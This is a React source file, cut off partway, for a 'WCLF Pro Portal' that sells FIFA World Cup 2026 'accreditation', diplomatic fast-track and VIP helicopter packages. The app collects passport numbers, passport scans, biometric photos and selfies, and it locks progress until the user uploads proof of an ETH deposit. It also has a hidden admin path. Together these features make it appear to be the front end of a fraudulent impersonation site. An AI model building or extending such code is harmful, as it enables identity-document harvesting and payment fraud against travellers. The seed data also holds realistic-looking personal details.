import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, AlertTriangle
} from 'lucide-react';
import { LANGUAGES, getTranslations } from './localization';
import { Language, Application, Announcement, SupportTicket } from './types';
import { dbService, isSupabaseConfigured, supabase } from './supabase';

import LanguageSelector from './components/LanguageSelector';
import AuthGate from './components/AuthGate';
import SignUp from './components/SignUp';
import ApplicationJourney from './components/ApplicationJourney';
import DossierPDF from './components/DossierPDF';
import TravelPortal from './components/TravelPortal';
import AdminPanel from './components/AdminPanel';
import PaymentPage from './components/PaymentPage';

const SEED_APPLICATIONS: Application[] = [
  {
    id: 'app_seed_1',
    applicationNumber: 'ACC-2026-EU-429012',
    timestamp: new Date().toISOString(),
    personalInfo: {
      fullName: 'Frank Saint-Amand (Demo Traveler)',
      email: 'franksaint830@gmail.com',
      phone: '+33 6 42 12 90 88',
      birthDate: '1993-08-21',
      nationality: 'French'
    },
    addressInfo: { street: '14 Rue de la Paix', city: 'Paris', postalCode: '75002', country: 'France' },
    passportInfo: { passportNumber: 'EU-FR9812450', expiryDate: '2032-10-10', issueCountry: 'France' },
    documents: {
      passportScanUrl: 'verified_doc_passport_binary',
      passportPhotoUrl: 'verified_biometric_photo_binary',
      selfieUrl: 'verified_selfie_scan_binary'
    },
    travelOrigin: { departureCity: 'Paris', departureCountry: 'France', preferredAirlineClass: 'Business' },
    matchPreferences: [
      { id: 'm2', homeTeam: 'Germany', awayTeam: 'Netherlands', venue: 'SoFi Stadium, Los Angeles', date: '2026-06-15', stage: 'Group Stage', category: 'Category 1', estimatedPrice: 320 },
      { id: 'm6', homeTeam: 'Presidential FIFA Final', awayTeam: 'Global World Cup Finalists', venue: 'MetLife Stadium, New York', date: '2026-07-19', stage: 'Final', category: 'Presidential Box', estimatedPrice: 2800 }
    ],
    attendanceType: 'FULL',
    accommodationPreferences: { tier: 'Luxury Resort', requirements: 'Rapid airport escort details with luxury shuttle assistance.' },
    additionalInfo: 'Clear of any judicial and territorial travel constraints.',
    costBreakdown: { baseUSD: 1000, matchCostUSD: 3120, accommodationCostUSD: 15750, priorityUpgradeCostUSD: 0, totalUSD: 19870 },
    status: 'CLEARANCE_GRANTED',
    applicationScore: 94,
    travelReadinessScore: 97,
    priorityLevel: 'EXECUTIVE',
    approvalTimeline: '48 Hours',
    reservationStatus: 'CONFIRMED',
    attendanceIndex: 'SEC-402/A'
  },
  {
    id: 'app_seed_2',
    applicationNumber: 'ACC-2026-EU-180459',
    timestamp: new Date().toISOString(),
    personalInfo: {
      fullName: 'Annette Weber',
      email: 'a.weber@berlin-tech.de',
      phone: '+49 172 459 2011',
      birthDate: '1989-11-04',
      nationality: 'German'
    },
    addressInfo: { street: 'Unter den Linden 40', city: 'Berlin', postalCode: '10117', country: 'Germany' },
    passportInfo: { passportNumber: 'EU-DE9012480', expiryDate: '2031-04-12', issueCountry: 'Germany' },
    documents: {
      passportScanUrl: 'verified_doc_passport_binary',
      passportPhotoUrl: 'verified_biometric_photo_binary',
      selfieUrl: 'verified_selfie_scan_binary'
    },
    travelOrigin: { departureCity: 'Berlin', departureCountry: 'Germany', preferredAirlineClass: 'Private Jet Offering' },
    matchPreferences: [
      { id: 'm6', homeTeam: 'Presidential FIFA Final', awayTeam: 'Global World Cup Finalists', venue: 'MetLife Stadium, New York', date: '2026-07-19', stage: 'Final', category: 'Presidential Box', estimatedPrice: 2800 }
    ],
    attendanceType: 'VIP_FINALS',
    accommodationPreferences: { tier: 'Luxury Resort', requirements: '24/7 personal airport reception and luxury transportation.' },
    additionalInfo: 'No previous judicial queries.',
    costBreakdown: { baseUSD: 1000, matchCostUSD: 2800, accommodationCostUSD: 17500, priorityUpgradeCostUSD: 5000, totalUSD: 26300 },
    status: 'PENDING_VERIFICATION',
    applicationScore: 98,
    travelReadinessScore: 99,
    priorityLevel: 'EXECUTIVE_VIP',
    approvalTimeline: '4 Hours (VIP Corridor)',
    reservationStatus: 'PROVISIONAL',
    attendanceIndex: 'SEC-890/A',
    paymentDetails: {
      method: 'ETH',
      depositAmountUSD: 2630,
      amountCrypto: 0.7514,
      proofUrl: 'https://images.unsplash.com/photo-1621416894569-0f39ed31d247?q=80&w=600&auto=format&fit=crop',
      uploadedAt: new Date(Date.now() - 3600000 * 2).toISOString(),
      status: 'PENDING_VERIFICATION'
    }
  }
];

const SEED_ANNOUNCEMENTS: Announcement[] = [
  {
    id: 'ann_1', timestamp: new Date().toISOString(),
    title: 'OFFICIAL AIRPORT VIP ACCREDITATIONS GRANTED',
    content: 'All premium vehicles and convoys scheduled near official stadiums must map air traffic and landing vectors 12 hours prior to match days.',
    scope: 'all'
  },
  {
    id: 'ann_2', timestamp: new Date().toISOString(),
    title: 'VIP CONVENIENCE PASS CHANNELS ACTIVE AT ALL PORTS',
    content: 'Attendees from European participating states traveling via private jet lanes can request custom fast-track immigration clears.',
    scope: 'priority_only'
  }
];

const SEED_TICKETS: SupportTicket[] = [
  {
    id: 'tkt_seed_1', applicationId: 'app_seed_1', applicationNumber: 'ACC-2026-EU-429012',
    userId: 'user_seed_frank', userName: 'Frank Saint-Amand',
    subject: 'Helicopter shuttle synchronization in NY NJ', status: 'OPEN',
    messages: [
      { id: 'm1', sender: 'user', timestamp: new Date(Date.now() - 3600000).toISOString(), text: 'Hello, can I request direct helicopter transfer from JFK premium FBO to the stadium zone on final matchday?' },
      { id: 'm2', sender: 'admin', timestamp: new Date(Date.now() - 1800000).toISOString(), text: 'Approved. Our luxury airport shuttle partners have verified your VIP badge coordinates. Safe travels!' }
    ]
  }
];

// ── FLOATING HEADER ──────────────────────────────────────────────────────
function FloatingHeader({ currentLanguage, onLanguageChange, activeUser, onLogoClick, onUserClick }: {
  currentLanguage: any; onLanguageChange: any; activeUser: any; onLogoClick: () => void; onUserClick: () => void;
}) {
  return (
    <header style={{
      position: 'fixed', top: 0, left: 0, right: 0, zIndex: 100,
      height: '64px', background: '#FFFFFF',
      borderBottom: '1px solid rgba(0,0,0,0.06)',
      display: 'flex', alignItems: 'center', justifyContent: 'center',
      padding: '0 24px',
    }}>
      <div style={{
        width: '100%', maxWidth: '1120px',
        display: 'flex', alignItems: 'center', justifyContent: 'space-between',
      }}>
        {/* Logo */}
        <div onClick={onLogoClick} style={{ display: 'flex', alignItems: 'center', cursor: 'pointer', userSelect: 'none' }}>
          <img src="/logo.png" alt="WCLF" style={{ height: '60px', width: 'auto' }} />
        </div>

        {/* Center — empty spacer to keep layout balanced */}
        <div />

        {/* Right Actions */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          <LanguageSelector currentLanguage={currentLanguage} onLanguageChange={onLanguageChange} />
          {activeUser ? (
            <button onClick={onUserClick}
              style={{
                display: 'inline-flex', alignItems: 'center', gap: '6px',
                padding: '8px 18px',
                background: '#0C0D12',
                border: 'none',
                borderRadius: '100px', fontSize: '13px', fontWeight: 600,
                color: '#fff', cursor: 'pointer',
                transition: 'opacity 0.15s',
              }} onMouseEnter={e => e.currentTarget.style.opacity = '0.9'} onMouseLeave={e => e.currentTarget.style.opacity = '1'}>
              <ShieldCheck size={14} />
              <span className="hide-mobile">{activeUser.email.split('@')[0]}</span>
            </button>
          ) : (
            <button onClick={onUserClick}
              style={{
                padding: '8px 20px',
                background: '#0C0D12',
                border: 'none',
                borderRadius: '100px', fontSize: '13px', fontWeight: 600,
                color: '#fff', cursor: 'pointer',
                transition: 'opacity 0.15s',
              }} onMouseEnter={e => e.currentTarget.style.opacity = '0.9'} onMouseLeave={e => e.currentTarget.style.opacity = '1'}>
              Use Gate
            </button>
          )}
        </div>
      </div>
    </header>
  );
}

function StatCard({ value, label, sub }: { value: string; label: string; sub?: string }) {
  return (
    <div style={{
      padding: '28px 24px', background: 'var(--surface-2)',
      border: '1px solid var(--border-dim)', borderRadius: '16px',
      display: 'flex', flexDirection: 'column', gap: '6px',
    }}>
      <span style={{
        fontFamily: 'var(--font-sans)', fontSize: 'clamp(26px, 4vw, 36px)',
        fontWeight: 800, color: 'var(--text-primary)', lineHeight: 1, letterSpacing: '-0.025em',
      }}>{value}</span>
      <span style={{ fontSize: '13px', fontWeight: 500, color: 'var(--text-secondary)', lineHeight: 1.4 }}>{label}</span>
      {sub && <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>{sub}</span>}
    </div>
  );
}

// ── PHONE FRAME ──────────────────────────────────────────────────────────
function PhoneFrame({ src, width, height, prominent }: { src: string; width: number; height: number; prominent?: boolean }) {
  const radius = Math.round(width * 0.13);
  const notchW = Math.round(width * 0.35);
  const notchH = 14;
  const border = prominent ? 2 : 1.5;

  return (
    <div style={{
      width: `${width}px`,
      height: `${height}px`,
      borderRadius: `${radius}px`,
      border: `${border}px solid rgba(255,255,255,${prominent ? 0.18 : 0.10})`,
      background: '#000',
      position: 'relative',
      overflow: 'hidden',
      boxShadow: prominent
        ? '0 40px 80px rgba(0,0,0,0.7), 0 0 0 1px rgba(255,255,255,0.06), 0 0 60px rgba(121,107,255,0.15)'
        : '0 20px 50px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.04)',
      flexShrink: 0,
    }}>
      {/* Screen image */}
      <img
        src={src}
        alt="Trophy showcase"
        style={{
          width: '100%',
          height: '100%',
          objectFit: 'cover',
          objectPosition: 'center',
          display: 'block',
        }}
      />

      {/* Dynamic island / notch */}
      <div style={{
        position: 'absolute',
        top: '12px',
        left: '50%',
        transform: 'translateX(-50%)',
        width: `${notchW}px`,
        height: `${notchH}px`,
        background: '#000',
        borderRadius: `${notchH}px`,
        zIndex: 10,
      }} />

      {/* Glare overlay */}
      <div style={{
        position: 'absolute',
        inset: 0,
        background: 'linear-gradient(135deg, rgba(255,255,255,0.07) 0%, transparent 50%)',
        pointerEvents: 'none',
        zIndex: 5,
      }} />
    </div>
  );
}

// ── HOMEPAGE ─────────────────────────────────────────────────────────────
function HomeLanding({ onApply, onAccess }: {
  onApply: () => void; onAccess: () => void;
}) {
  return (
    <div style={{ maxWidth: '1120px', margin: '0 auto', width: '100%' }}>

      {/* ── HERO ── */}
      <section style={{
        paddingTop: 'clamp(60px, 8vw, 100px)',
        paddingBottom: 'clamp(40px, 6vw, 80px)',
        textAlign: 'center', maxWidth: '860px', margin: '0 auto',
        display: 'flex', flexDirection: 'column', alignItems: 'center',
        padding: 'clamp(60px,8vw,100px) 16px clamp(40px,6vw,80px)',
      }}>
        {/* Logo pill */}
        <div style={{
          display: 'inline-flex',
          alignItems: 'center',
          gap: '9px',
          padding: '6px 14px',
          marginBottom: '32px',
          borderRadius: '100px',
          background: 'rgba(121, 107, 255, 0.08)',
          border: '1px solid rgba(121, 107, 255, 0.15)',
        }}>
          <svg width="14" height="14" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M16 2C9.373 2 4 7.373 4 14C4 20.627 9.373 26 16 26C22.627 26 28 20.627 28 14C28 7.373 22.627 2 16 2ZM16 23C11.028 23 7 18.972 7 14C7 9.028 11.028 5 16 5C20.972 5 25 9.028 25 14C25 18.972 20.972 23 16 23Z" fill="#B6B3FF" />
          </svg>
          <span style={{ fontSize: '13px', fontWeight: 600, color: '#B6B3FF', letterSpacing: '0.03em' }}>
            WCLF Pro Portal
          </span>
        </div>

        {/* Headline */}
        <h1 style={{
          fontSize: 'clamp(36px, 6vw, 76px)',
          fontWeight: 800, color: '#FFFFFF',
          lineHeight: 1.05, letterSpacing: '-0.03em', marginBottom: '20px',
          maxWidth: '720px'
        }}>
          Your accreditation, end to end.
        </h1>

        {/* Subtitle */}
        <p style={{
          fontSize: 'clamp(14px, 1.8vw, 16px)', color: '#8B8FA8',
          lineHeight: 1.6, maxWidth: '480px', margin: '0 auto 36px', fontWeight: 400,
        }}>
          Secure clearance, premium logistics, and fast-track stadium access for European attendees travelling to FIFA World Cup 2026.
        </p>

        {/* Buttons */}
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '12px', flexWrap: 'wrap' }}>
          <button onClick={onApply} className="btn-primary">
            Get Started
          </button>
          <button onClick={onAccess} className="btn-secondary">
            Learn More
          </button>
        </div>
      </section>

      {/* ── PHONE SHOWCASE ── */}
      <section style={{
        padding: '0 24px',
        marginBottom: '72px',
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'flex-end',
        gap: '0px',
        minHeight: '420px',
        position: 'relative',
      }}>

        {/* Glow backdrop */}
        <div style={{
          position: 'absolute',
          inset: 0,
          background: 'radial-gradient(ellipse 60% 50% at 50% 80%, rgba(121,107,255,0.12) 0%, transparent 70%)',
          pointerEvents: 'none',
        }} />

        {/* LEFT PHONE — angle1.jpg, tilted left, behind */}
        <div style={{
          transform: 'rotate(-12deg) translateX(40px) translateY(24px)',
          zIndex: 1,
          flexShrink: 0,
        }}>
          <PhoneFrame src="/trophy/angle 1.jpg" width={200} height={400} />
        </div>

        {/* CENTER PHONE — angle4.jpg, upright, front */}
        <div style={{
          transform: 'translateY(0px)',
          zIndex: 3,
          flexShrink: 0,
        }}>
          <PhoneFrame src="/trophy/angle 4.jpg" width={240} height={480} prominent />
        </div>

        {/* RIGHT PHONE — angle6.jpg, tilted right, behind */}
        <div style={{
          transform: 'rotate(12deg) translateX(-40px) translateY(24px)',
          zIndex: 1,
          flexShrink: 0,
        }}>
          <PhoneFrame src="/trophy/angle 6.jpg" width={200} height={400} />
        </div>

      </section>

      {/* ── STRATEGIES / MARKETS SECTION ── */}
      <section style={{ padding: '0 24px 24px' }}>
        <div style={{ textAlign: 'center', marginBottom: '32px' }}>
          <h2 style={{ fontSize: 'clamp(24px, 3.5vw, 36px)', fontWeight: 700, color: '#FFFFFF', letterSpacing: '-0.02em', marginBottom: '10px' }}>
            Markets for every strategy.
          </h2>
          <p style={{ fontSize: '14px', color: '#8B8FA8', maxWidth: '520px', lineHeight: 1.5, margin: '0 auto' }}>
            From standard security credentials to executive VIP helipad clearances, select the accreditation track that fits your travel portfolio.
          </p>
        </div>

        {/* 3 Columns */}
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px' }}>
          
          {/* Card 1 */}
          <div style={{
            background: '#121420',
            border: '1px solid rgba(255,255,255,0.06)',
            borderRadius: '16px',
            padding: '24px',
            display: 'flex',
            flexDirection: 'column',
            gap: '12px',
            transition: 'border-color 0.2s',
          }} onMouseEnter={e => e.currentTarget.style.borderColor = 'rgba(121, 107, 255, 0.4)'} onMouseLeave={e => e.currentTarget.style.borderColor = 'rgba(255,255,255,0.06)'}>
            <span style={{ fontSize: '12px', fontWeight: 600, color: '#B6B3FF', textTransform: 'uppercase', letterSpacing: '0.05em' }}>General Clearance</span>
            <h4 style={{ fontSize: '18px', fontWeight: 700, color: '#FFFFFF', margin: 0 }}>Standard • Core</h4>
            <p style={{ fontSize: '13px', color: '#8B8FA8', lineHeight: 1.5, margin: 0 }}>
              Basic visa waiver, security screening, and general stadium accreditation.
            </p>
          </div>

          {/* Card 2 */}
          <div style={{
            background: '#121420',
            border: '1px solid rgba(255,255,255,0.06)',
            borderRadius: '16px',
            padding: '24px',
            display: 'flex',
            flexDirection: 'column',
            gap: '12px',
            transition: 'border-color 0.2s',
          }} onMouseEnter={e => e.currentTarget.style.borderColor = 'rgba(121, 107, 255, 0.4)'} onMouseLeave={e => e.currentTarget.style.borderColor = 'rgba(255,255,255,0.06)'}>
            <span style={{ fontSize: '12px', fontWeight: 600, color: '#B6B3FF', textTransform: 'uppercase', letterSpacing: '0.05em' }}>Priority Logistics</span>
            <h4 style={{ fontSize: '18px', fontWeight: 700, color: '#FFFFFF', margin: 0 }}>Executive • Prime</h4>
            <p style={{ fontSize: '13px', color: '#8B8FA8', lineHeight: 1.5, margin: 0 }}>
              Luxury airport transport, diplomatic check-ins, and club suite access.
            </p>
          </div>

          {/* Card 3 */}
          <div style={{
            background: '#121420',
            border: '1px solid rgba(255,255,255,0.06)',
            borderRadius: '16px',
            padding: '24px',
            display: 'flex',
            flexDirection: 'column',
            gap: '12px',
            transition: 'border-color 0.2s',
          }} onMouseEnter={e => e.currentTarget.style.borderColor = 'rgba(121, 107, 255, 0.4)'} onMouseLeave={e => e.currentTarget.style.borderColor = 'rgba(255,255,255,0.06)'}>
            <span style={{ fontSize: '12px', fontWeight: 600, color: '#B6B3FF', textTransform: 'uppercase', letterSpacing: '0.05em' }}>WCLF Level</span>
            <h4 style={{ fontSize: '18px', fontWeight: 700, color: '#FFFFFF', margin: 0 }}>VIP Finals • Plus</h4>
            <p style={{ fontSize: '13px', color: '#8B8FA8', lineHeight: 1.5, margin: 0 }}>
              Presidential box access, private helicopter transfers, and 24/7 dedicated support.
            </p>
          </div>

        </div>
      </section>

    </div>
  );
}


// ── MAIN APP ──────────────────────────────────────────────────────────────
export default function App() {
  const [currentLanguage, setCurrentLanguage] = useState<Language>(LANGUAGES[0]);
  const t = getTranslations(currentLanguage.code);

  const [applications, setApplications] = useState<Application[]>([]);
  const [announcements, setAnnouncements] = useState<Announcement[]>([]);
  const [tickets, setTickets] = useState<SupportTicket[]>([]);
  const [activeUser, setActiveUser] = useState<{ email: string; role: 'traveler' | 'admin'; country: string; fullName?: string } | null>(null);
  const [currentScreen, setCurrentScreen] = useState<'home' | 'signup' | 'apply' | 'auth' | 'journey' | 'admin' | 'dossier' | 'payment'>('home');

  const getTravelerDefaultScreen = (app: Application | null | undefined, intended?: string | null): 'apply' | 'payment' | 'journey' | 'dossier' => {
    if (!app) return 'apply';
    const payStatus = app.paymentDetails?.status;
    if (payStatus !== 'APPROVED') {
      if (!payStatus) return 'payment';
      // If proof is uploaded (PENDING_VERIFICATION or REJECTED), they can go to intended if valid
      if (intended && ['journey', 'dossier', 'payment'].includes(intended)) return intended as any;
      return 'journey';
    }
    if (intended && ['journey', 'dossier'].includes(intended)) return intended as any;
    return 'journey';
  };

  // Check for secure admin path on mount
  const [isAdminPathAccessed, setIsAdminPathAccessed] = useState(false);

  useEffect(() => {
    if (window.location.pathname === '/adm_9x2b7f_secure') {
      setIsAdminPathAccessed(true);
      window.history.replaceState({}, '', '/');
      setCurrentScreen('auth');
    }
  }, []);

  // In-memory routing and route protection
  useEffect(() => {
    const protectedScreens = ['apply', 'journey', 'admin', 'dossier', 'payment'];
    
    if (protectedScreens.includes(currentScreen) && !activeUser) {
      localStorage.setItem('fifa_intended_screen', currentScreen);
      setCurrentScreen('auth');
      return;
    }

    if (activeUser) {
      if (activeUser.role === 'admin') {
        if (currentScreen !== 'admin') {
          setCurrentScreen('admin');
        }
      } else {
        // Traveler route protection and checks
        const app = applications.find(a => a.personalInfo.email.toLowerCase() === activeUser.email.toLowerCase());
        if (!app) {
          if (currentScreen !== 'apply') {
            setCurrentScreen('apply');
          }
        } else {
          const payStatus = app.paymentDetails?.status;
          if (payStatus !== 'APPROVED') {
            if (!payStatus) {
              if (currentScreen !== 'payment') {
                setCurrentScreen('payment');
              }
            } else {
              if (!['payment', 'journey', 'dossier'].includes(currentScreen)) {
                setCurrentScreen('journey');
              }
            }
          } else {
            if (!['journey', 'dossier'].includes(currentScreen)) {
              setCurrentScreen('journey');
            }
          }
        }
      }
    }
  }, [currentScreen, activeUser, applications]);

  useEffect(() => {
    const fetchAllData = async () => {
      let apps = await dbService.fetchApplications();
      if (apps.length === 0) {
        for (const app of SEED_APPLICATIONS) await dbService.insertApplication(app);
        apps = await dbService.fetchApplications();
      }
      let anns = await dbService.fetchAnnouncements();
      if (anns.length === 0) {
        for (const ann of SEED_ANNOUNCEMENTS) await dbService.insertAnnouncement(ann);
        anns = await dbService.fetchAnnouncements();
      }
      let tkts = await dbService.fetchTickets();
      if (tkts.length === 0) {
        for (const tkt of SEED_TICKETS) await dbService.insertTicket(tkt);
        tkts = await dbService.fetchTickets();
      }
      setApplications(apps); setAnnouncements(anns); setTickets(tkts);
    };
    fetchAllData();
    if (isSupabaseConfigured && supabase) {
      const channel = supabase
        .channel('realtime_tables_sync')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'applications' }, fetchAllData)
        .on('postgres_changes', { event: '*', schema: 'public', table: 'announcements' }, fetchAllData)
        .on('postgres_changes', { event: '*', schema: 'public', table: 'tickets' }, fetchAllData)
        .subscribe();
      return () => { supabase.removeChannel(channel); };
    }
  }, []);

  useEffect(() => { localStorage.setItem('fifa_wclf_announcements', JSON.stringify(announcements)); }, [announcements]);
  useEffect(() => { localStorage.setItem('fifa_wclf_tickets', JSON.stringify(tickets)); }, [tickets]);

  const activeTravelerApp = activeUser?.role === 'traveler'
    ? applications.find(a => a.personalInfo.email.toLowerCase() === activeUser.email.toLowerCase())
    : null;

  const handleUpdateAppStatus = async (appId: string, status: Application['status']) => {
    setApplications(prev => prev.map(a => a.id === appId ? { ...a, status, reservationStatus: status === 'CLEARANCE_GRANTED' ? 'CONFIRMED' : 'PROVISIONAL' } : a));
    await dbService.updateApplicationStatus(appId, status);
  };
  const handleDeleteApplication = async (appId: string) => {
    setApplications(prev => prev.filter(a => a.id !== appId));
    await dbService.deleteApplication(appId);
  };
  const handleAddAnnouncement = async (title: string, content: string, scope: Announcement['scope'], country?: string) => {
    const newAnn: Announcement = { id: `ann_${Date.now()}`, timestamp: new Date().toISOString(), title, content, scope, targetCountry: country };
    setAnnouncements(prev => [newAnn, ...prev]);
    await dbService.insertAnnouncement(newAnn);
  };
  const handleAdminTicketResponse = async (ticketId: string, text: string) => {
    setTickets(prev => prev.map(t => {
      if (t.id !== ticketId) return t;
      const messages = [...t.messages, { id: `msg_${Date.now()}`, sender: 'admin' as const, timestamp: new Date().toISOString(), text }];
      dbService.updateTicketMessages(ticketId, messages);
      return { ...t, messages };
    }));
  };
  const handleUserTicketResponse = async (ticketId: string, text: string) => {
    setTickets(prev => prev.map(t => {
      if (t.id !== ticketId) return t;
      const messages = [...t.messages, { id: `msg_${Date.now()}`, sender: 'user' as const, timestamp: new Date().toISOString(), text }];
      dbService.updateTicketMessages(ticketId, messages);
      return { ...t, messages };
    }));
  };
  const handleCreateSupportTicket = async (subject: string, firstText: string) => {
    if (!activeTravelerApp) return;
    const newTkt: SupportTicket = {
      id: `tkt_${Date.now()}`, applicationId: activeTravelerApp.id,
      applicationNumber: activeTravelerApp.applicationNumber,
      userId: activeTravelerApp.personalInfo.email, userName: activeTravelerApp.personalInfo.fullName,
      subject, status: 'OPEN',
      messages: [{ id: `m_${Date.now()}`, sender: 'user', timestamp: new Date().toISOString(), text: firstText }]
    };
    setTickets(prev => [newTkt, ...prev]);
    await dbService.insertTicket(newTkt);
  };
  const handleUpdateApplication = async (appId: string, updates: Partial<Application>) => {
    setApplications(prev => prev.map(a => a.id === appId ? { ...a, ...updates } : a));
    const existing = applications.find(a => a.id === appId);
    if (existing) await dbService.insertApplication({ ...existing, ...updates });
  };

  const handleSendDirectMessage = (userEmail: string, subject: string, message: string) => {
    const key = `fifa_admin_direct_messages`;
    const existing = JSON.parse(localStorage.getItem(key) || '[]');
    existing.push({ to: userEmail, subject, message, sentAt: new Date().toISOString() });
    localStorage.setItem(key, JSON.stringify(existing));
    const userKey = `fifa_inbox_${userEmail.toLowerCase()}`;
    const userInbox = JSON.parse(localStorage.getItem(userKey) || '[]');
    userInbox.unshift({ subject, message, from: 'admin', sentAt: new Date().toISOString(), read: false });
    localStorage.setItem(userKey, JSON.stringify(userInbox));
  };

  const handleNewApplicationSuccess = async (newApp: Application) => {
    setApplications(prev => [newApp, ...prev]);
    setActiveUser({ email: newApp.personalInfo.email, role: 'traveler', country: newApp.personalInfo.nationality, fullName: newApp.personalInfo.fullName });
    await dbService.insertApplication(newApp);
    setCurrentScreen('payment');
  };

  return (
    <div style={{
      minHeight: '100vh', background: '#13131A',
      color: '#0C0D12', fontFamily: 'var(--font-sans)', overflowX: 'hidden',
    }}>
      {/* ── HEADER ── */}
      <FloatingHeader
        currentLanguage={currentLanguage}
        onLanguageChange={setCurrentLanguage}
        activeUser={activeUser}
        onLogoClick={() => setCurrentScreen('home')}
        onUserClick={() => setCurrentScreen(activeUser?.role === 'admin' ? 'admin' : 'journey')}
      />

      {/* ── MAIN ── */}
      <main style={{ position: 'relative', zIndex: 1, paddingBottom: '64px', paddingTop: '84px', paddingLeft: '16px', paddingRight: '16px' }}>
        <div style={{
          maxWidth: '1120px',
          margin: '0 auto',
          background: '#0C0D12',
          borderRadius: '28px',
          border: '1px solid rgba(255, 255, 255, 0.05)',
          boxShadow: '0 30px 70px rgba(0,0,0,0.3)',
          overflow: 'hidden',
          padding: currentScreen === 'home' ? '0' : '40px 16px',
        }}>
          {currentScreen === 'home' && (
            <HomeLanding
              onApply={() => setCurrentScreen('signup')}
              onAccess={() => setCurrentScreen('auth')}
            />
          )}

          {currentScreen === 'signup' && (
            <SignUp
              lang={currentLanguage}
              onSignUpSuccess={(user) => {
                setActiveUser({ email: user.email, role: 'traveler', country: user.country, fullName: user.fullName });
                setCurrentScreen('apply');
              }}
              onSwitchToLogin={() => setCurrentScreen('auth')}
            />
          )}

          {currentScreen === 'apply' && (
            <ApplicationJourney
              currentLanguage={currentLanguage}
              userEmail={activeUser?.email || ''}
              onSubmissionSuccess={handleNewApplicationSuccess}
              onCancel={() => setCurrentScreen(activeUser ? 'journey' : 'home')}
            />
          )}

          {currentScreen === 'auth' && (
            <div>
              <AuthGate lang={currentLanguage} isAdminPathAccessed={isAdminPathAccessed} onAuthSuccess={(user) => {
                const saved = localStorage.getItem(`fifa_account_${user.email.toLowerCase()}`);
                const accountData = saved ? JSON.parse(saved) : null;
                const fullUser = {
                  ...user,
                  fullName: accountData?.fullName,
                  country: accountData?.country ? (LANGUAGES.find(l => l.code === accountData.country)?.name || user.country) : user.country,
                };
                setActiveUser(fullUser);

                if (user.role === 'admin') {
                  setCurrentScreen('admin');
                } else {
                  const app = applications.find(a => a.personalInfo.email.toLowerCase() === user.email.toLowerCase());
                  const intended = localStorage.getItem('fifa_intended_screen');
                  localStorage.removeItem('fifa_intended_screen');
                  
                  if (!app) {
                    setCurrentScreen('apply');
                  } else {
                    const nextScreen = getTravelerDefaultScreen(app, intended);
                    setCurrentScreen(nextScreen);
                  }
                }
              }} />
              <div style={{ textAlign: 'center', marginTop: '20px' }}>
                <span style={{ fontSize: '12px', color: '#8B8FA8' }}>Don't have an account? </span>
                <button
                  onClick={() => setCurrentScreen('signup')}
                  style={{ fontSize: '12px', color: '#796BFF', background: 'none', border: 'none', cursor: 'pointer', textDecoration: 'underline', fontWeight: 600 }}
                >
                  Sign up
                </button>
              </div>
            </div>
          )}

          {currentScreen === 'journey' && (
            <div style={{ padding: '24px 16px 0' }}>
              <div style={{ display: 'flex', alignItems: 'flex-end', justifyContent: 'space-between', flexWrap: 'wrap', gap: '12px', marginBottom: '28px' }}>
                <div>
                  <p style={{ fontSize: '11px', fontWeight: 600, letterSpacing: '0.08em', textTransform: 'uppercase', color: '#8B8FA8', marginBottom: '6px' }}>Active session</p>
                  <h2 style={{ fontSize: 'clamp(18px,3vw,24px)', fontWeight: 700, color: '#fff' }}>{activeUser?.email}</h2>
                </div>
                {activeTravelerApp && (
                  <button 
                    onClick={() => {
                      if (activeTravelerApp.paymentDetails?.status !== 'APPROVED') {
                        alert('Print dossier is locked until your deposit payment is approved.');
                      } else {
                        setCurrentScreen('dossier');
                      }
                    }} 
                    className="btn-secondary" 
                    style={{ 
                      padding: '9px 18px', 
                      fontSize: '13px', 
                      opacity: activeTravelerApp.paymentDetails?.status === 'APPROVED' ? 1 : 0.5,
                      cursor: activeTravelerApp.paymentDetails?.status === 'APPROVED' ? 'pointer' : 'not-allowed'
                    }}
                  >
                    Print dossier
                  </button>
                )}
              </div>
              {activeTravelerApp ? (
                <TravelPortal
                  application={activeTravelerApp} lang={currentLanguage}
                  onLogout={() => { setActiveUser(null); setCurrentScreen('home'); }}
                  announcements={announcements} tickets={tickets}
                  onAddTicketMessage={handleUserTicketResponse}
                  onNewTicket={handleCreateSupportTicket}
                  onNavigateToPayment={() => setCurrentScreen('payment')}
                />
              ) : (
                <div style={{
                  maxWidth: '440px', margin: '0 auto', padding: '40px',
                  background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.07)',
                  borderRadius: '20px', textAlign: 'center',
                }}>
                  <AlertTriangle size={22} style={{ color: '#8B8FA8', marginBottom: '16px' }} />
                  <h4 style={{ fontSize: '16px', fontWeight: 600, color: '#fff', marginBottom: '10px' }}>No application found</h4>
                  <p style={{ fontSize: '14px', color: '#8B8FA8', lineHeight: 1.65, marginBottom: '24px' }}>
                    No clearance on record for <strong style={{ color: '#fff' }}>{activeUser?.email}</strong>.
                  </p>
                  <div style={{ display: 'flex', gap: '10px', justifyContent: 'center', flexWrap: 'wrap' }}>
                    <button className="btn-primary" onClick={() => setCurrentScreen('apply')} style={{ padding: '11px 22px', fontSize: '14px' }}>Apply now</button>
                    <button className="btn-secondary" onClick={() => { setActiveUser(null); setCurrentScreen('home'); }} style={{ padding: '11px 22px', fontSize: '14px' }}>Go back</button>
                  </div>
                </div>
              )}
            </div>
          )}

          {currentScreen === 'payment' && activeTravelerApp && (
            <div style={{ padding: '24px 16px 0' }}>
              <PaymentPage
                application={activeTravelerApp}
                lang={currentLanguage}
                onPaymentSubmit={async (updatedApp) => {
                  setApplications(prev => prev.map(a => a.id === updatedApp.id ? updatedApp : a));
                  await dbService.insertApplication(updatedApp);
                  setCurrentScreen('journey');
                }}
                onCancel={() => setCurrentScreen('journey')}
              />
            </div>
          )}

          {currentScreen === 'admin' && activeUser?.role === 'admin' && (
            <div style={{ padding: '24px 16px 0' }}>
              <AdminPanel
                applications={applications} onUpdateAppStatus={handleUpdateAppStatus}
                onUpdateApplication={handleUpdateApplication}
                onDeleteApplication={handleDeleteApplication} announcements={announcements}
